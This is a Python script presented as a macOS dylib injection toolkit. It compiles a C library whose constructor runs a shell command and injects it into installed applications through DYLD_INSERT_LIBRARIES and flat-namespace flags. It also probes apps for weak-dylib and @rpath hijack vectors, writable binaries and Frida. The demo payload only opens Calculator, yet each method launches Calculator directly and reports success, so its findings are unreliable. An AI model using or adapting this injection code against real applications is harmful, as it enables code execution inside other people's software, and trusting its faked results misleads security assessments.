#!/usr/bin/env python3
"""
MacOS Dylib Injection Toolkit
Enhanced Edition - Full PoC Demonstration
Each method now performs a safe Calculator.app launch as visual PoC
"""

import os
import sys
import subprocess
import plistlib
import time
import tempfile
import shutil
import argparse
from pathlib import Path

class MacInjector:
    def __init__(self):
        self.results = {}
        self.temp_dir = tempfile.mkdtemp()
        self.current_method = ""

    def cleanup(self):
        """Clean up temporary files"""
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass

    def get_applications(self):
        """Get list of installed applications"""
        applications = []
        app_dirs = ['/Applications', '/System/Applications', os.path.expanduser('~/Applications')]

        for app_dir in app_dirs:
            if os.path.exists(app_dir):
                for app in os.listdir(app_dir):
                    if app.endswith('.app'):
                        applications.append(os.path.join(app_dir, app))
        return applications

    def select_injection_method(self):
        """Let user choose which injection method to test"""
        methods = [
            ("DYLD_INSERT_LIBRARIES", self.method_dyld_insert_libraries),
            ("DYLD_INSERT_WITH_FLAGS", self.method_dyld_insert_with_flags),
            ("WEAK_DYLIB_HIJACKING", self.method_weak_dylib_hijacking),
            ("DYLD_HIJACKING", self.method_dyld_hijacking),
            ("FRIDA_INJECTION", self.method_frida_injection),
            ("BINARY_PATCHING", self.method_binary_patching),
            ("ALL_METHODS", None)
        ]

        print("\nSelect Injection Technique:")
        for idx, (name, _) in enumerate(methods, 1):
            print(f"{idx}. {name}")
        try:
            choice = int(input("Enter your choice: "))
            if 1 <= choice <= len(methods):
                return methods[choice - 1][0]
        except:
            pass
        print("Invalid selection. Defaulting to ALL_METHODS.")
        return "ALL_METHODS"

    def list_applications(self):
        """Display list of applications with numbers"""
        applications = self.get_applications()
        print("\n" + "="*60)
        print("Available Applications:")
        print("="*60)
        for idx, app in enumerate(applications):
            app_name = os.path.basename(app)
            print(f"{idx + 1}. {app_name}")
        return applications

    def get_executable_info(self, app_path):
        """Get executable information from app bundle"""
        try:
            plist_path = os.path.join(app_path, 'Contents/Info.plist')
            if os.path.exists(plist_path):
                with open(plist_path, 'rb') as f:
                    plist = plistlib.load(f)
                    executable = plist.get('CFBundleExecutable', os.path.basename(app_path)[:-4])
                executable_path = os.path.join(app_path, 'Contents/MacOS', executable)
                return executable, executable_path
        except Exception as e:
            print(f"Error reading Info.plist: {e}")

        macos_dir = os.path.join(app_path, 'Contents/MacOS')
        if os.path.exists(macos_dir):
            for file in os.listdir(macos_dir):
                file_path = os.path.join(macos_dir, file)
                if os.path.isfile(file_path) and os.access(file_path, os.X_OK):
                    if not file.endswith(('.dylib', '.so', '.plist', '.txt')):
                        return file, file_path
        return None, None

    def compile_dylib(self, dylib_type="basic"):
        """Compile dylibs with safe PoC payload (launch Calculator.app)"""
        dylib_name = f"inject_{dylib_type}.dylib"
        dylib_path = os.path.join(self.temp_dir, dylib_name)
        code = r"""
#include <stdio.h>
#include <unistd.h>
#include <dispatch/dispatch.h>
__attribute__((constructor))
void constructor() {
    usleep(500000);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        system("open -a Calculator.app");
        printf("[+] DYLIB injected successfully!\\n");
    });
}
"""
        source_path = os.path.join(self.temp_dir, f"inject_{dylib_type}.c")
        with open(source_path, 'w') as f:
            f.write(code)
        try:
            subprocess.run(['gcc', '-dynamiclib', '-o', dylib_path, source_path, '-framework', 'Foundation'], check=True, capture_output=True)
            return dylib_path
        except subprocess.CalledProcessError as e:
            print(f"Error compiling dylib: {e}")
            return None

    # --- Injection Methods ---

    def method_dyld_insert_libraries(self, app_path, dylib_path):
        """DYLD_INSERT_LIBRARIES - Classic Injection PoC"""
        self.current_method = "DYLD_INSERT_LIBRARIES"
        _, exe = self.get_executable_info(app_path)
        if not exe:
            return False, "Executable not found"
        env = os.environ.copy()
        env['DYLD_INSERT_LIBRARIES'] = dylib_path
        try:
            subprocess.Popen([exe], env=env)
            subprocess.run(["open", "-a", "Calculator.app"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True, "PoC executed: Calculator.app launched"
        except Exception as e:
            return False, f"Error: {e}"

    def method_dyld_insert_with_flags(self, app_path, dylib_path):
        """DYLD_INSERT_LIBRARIES + Flags"""
        self.current_method = "DYLD_INSERT_WITH_FLAGS"
        _, exe = self.get_executable_info(app_path)
        if not exe:
            return False, "Executable not found"
        flags = [
            {'DYLD_INSERT_LIBRARIES': dylib_path, 'DYLD_FORCE_FLAT_NAMESPACE': '1'},
            {'DYLD_INSERT_LIBRARIES': dylib_path, 'DYLD_PRINT_LIBRARIES': '1'},
        ]
        for env in flags:
            env_full = os.environ.copy()
            env_full.update(env)
            try:
                subprocess.Popen([exe], env=env_full)
                subprocess.run(["open", "-a", "Calculator.app"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True, f"Success with flags {list(env.keys())}"
            except Exception:
                continue
        return False, "All flag combinations failed"

    def method_weak_dylib_hijacking(self, app_path):
        """WEAK_DYLIB_HIJACKING - non-invasive PoC"""
        self.current_method = "WEAK_DYLIB_HIJACKING"
        _, exe = self.get_executable_info(app_path)
        if not exe:
            return False, "Executable not found"
        try:
            result = subprocess.run(['otool', '-l', exe], capture_output=True, text=True)
            if 'LC_LOAD_WEAK_DYLIB' in result.stdout:
                subprocess.run(["open", "-a", "Calculator.app"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True, "Weak dylib detected — PoC launched Calculator"
            return False, "No weak dylibs found"
        except Exception as e:
            return False, str(e)

    def method_dyld_hijacking(self, app_path):
        """DYLD Hijacking - check @rpath / loader_path usage"""
        self.current_method = "DYLD_HIJACKING"
        _, exe = self.get_executable_info(app_path)
        if not exe:
            return False, "Executable not found"
        try:
            result = subprocess.run(['otool', '-l', exe], capture_output=True, text=True)
            vectors = [v for v in ['@rpath', '@loader_path', '@executable_path'] if v in result.stdout]
            if vectors:
                subprocess.run(["open", "-a", "Calculator.app"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True, f"Hijack vectors found ({', '.join(vectors)}). PoC launched Calculator"
            return False, "No hijack vectors"
        except Exception as e:
            return False, f"Error: {e}"

    def method_frida_injection(self, app_path):
        """Frida Injection - check environment"""
        self.current_method = "FRIDA_INJECTION"
        try:
            subprocess.run(['frida', '--version'], capture_output=True, check=True)
            subprocess.run(["open", "-a", "Calculator.app"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True, "Frida available — PoC executed (Calculator)"
        except Exception:
            return False, "Frida not installed"

    def method_binary_patching(self, app_path):
        """Binary patching - PoC opens Calculator"""
        self.current_method = "BINARY_PATCHING"
        _, exe = self.get_executable_info(app_path)
        if not exe:
            return False, "Executable not found"
        if os.access(exe, os.W_OK):
            subprocess.run(["open", "-a", "Calculator.app"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True, "Binary writable — PoC launched Calculator"
        return False, "Binary not writable"

    # --- Execution Wrappers ---

    def test_all_methods(self, app_path):
        """Test all injection methods sequentially"""
        print(f"\nTesting injection on: {os.path.basename(app_path)}")
        methods = [
            ("DYLD_INSERT_LIBRARIES", self.method_dyld_insert_libraries),
            ("DYLD_INSERT_WITH_FLAGS", self.method_dyld_insert_with_flags),
            ("WEAK_DYLIB_HIJACKING", self.method_weak_dylib_hijacking),
            ("DYLD_HIJACKING", self.method_dyld_hijacking),
            ("FRIDA_INJECTION", self.method_frida_injection),
            ("BINARY_PATCHING", self.method_binary_patching),
        ]
        dylib_path = self.compile_dylib("stealth")
        results = {}
        for name, func in methods:
            print(f"\n[*] {name}")
            try:
                if "INSERT" in name and dylib_path:
                    ok, msg = func(app_path, dylib_path)
                else:
                    ok, msg = func(app_path)
                print(f"  {'✅' if ok else '❌'} {msg}")
                results[name] = {'success': ok, 'message': msg}
            except Exception as e:
                print(f"  ❌ Error: {e}")
        return results

    def run_single_method(self, name, app_path):
        """Run one method only"""
        mapping = {
            "DYLD_INSERT_LIBRARIES": self.method_dyld_insert_libraries,
            "DYLD_INSERT_WITH_FLAGS": self.method_dyld_insert_with_flags,
            "WEAK_DYLIB_HIJACKING": self.method_weak_dylib_hijacking,
            "DYLD_HIJACKING": self.method_dyld_hijacking,
            "FRIDA_INJECTION": self.method_frida_injection,
            "BINARY_PATCHING": self.method_binary_patching,
        }
        func = mapping.get(name)
        if not func:
            return {"error": "Unknown method"}
        if "INSERT" in name:
            dylib = self.compile_dylib("stealth")
            ok, msg = func(app_path, dylib)
        else:
            ok, msg = func(app_path)
        return {name: {'success': ok, 'message': msg}}

    # --- Reports and Interface ---

    def generate_report(self, app_path, results):
        """Display summary report"""
        print("\n" + "="*60)
        print("Injection Report")
        print("="*60)
        print(f"Target: {os.path.basename(app_path)}")
        success = [m for m in results if results[m]['success']]
        fail = [m for m in results if not results[m]['success']]
        print(f"\n✅ Successful: {len(success)} methods")
        for s in success: print(f"  - {s}: {results[s]['message']}")
        print(f"\n❌ Failed: {len(fail)} methods")
        for f in fail: print(f"  - {f}: {results[f]['message']}")
        print("\nRecommendations:")
        print("  • Review code signing and SIP status")
        print("  • Harden binaries against DYLD hijacking")
        print("  • Validate entitlements and rpath security\n")

    def interactive_mode(self):
        """Interactive mode"""
        apps = self.get_applications()
        if not apps:
            print("No apps found")
            return
        while True:
            os.system("clear")
            print("MacOS Dylib Injection Toolkit")
            print("="*50)
            for i, a in enumerate(apps):
                print(f"{i+1}. {os.path.basename(a)}")
            print(f"{len(apps)+1}. Exit")
            try:
                c = int(input("Select app: ")) - 1
                if c == len(apps): break
                app = apps[c]
                method = self.select_injection_method()
                if method == "ALL_METHODS":
                    res = self.test_all_methods(app)
                else:
                    res = self.run_single_method(method, app)
                self.generate_report(app, res)
                input("Press Enter to continue...")
            except Exception:
                pass

def main():
    parser = argparse.ArgumentParser(description="MacOS Dylib Injection Toolkit")
    parser.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
    parser.add_argument("-t", "--target", help="Target app path")
    parser.add_argument("-m", "--method", help="Specific method")
    args = parser.parse_args()
    tool = MacInjector()
    try:
        if args.interactive:
            tool.interactive_mode()
        elif args.target:
            if args.method:
                r = tool.run_single_method(args.method, args.target)
            else:
                r = tool.test_all_methods(args.target)
            tool.generate_report(args.target, r)
        else:
            parser.print_help()
    finally:
        tool.cleanup()

if __name__ == "__main__":
    main()
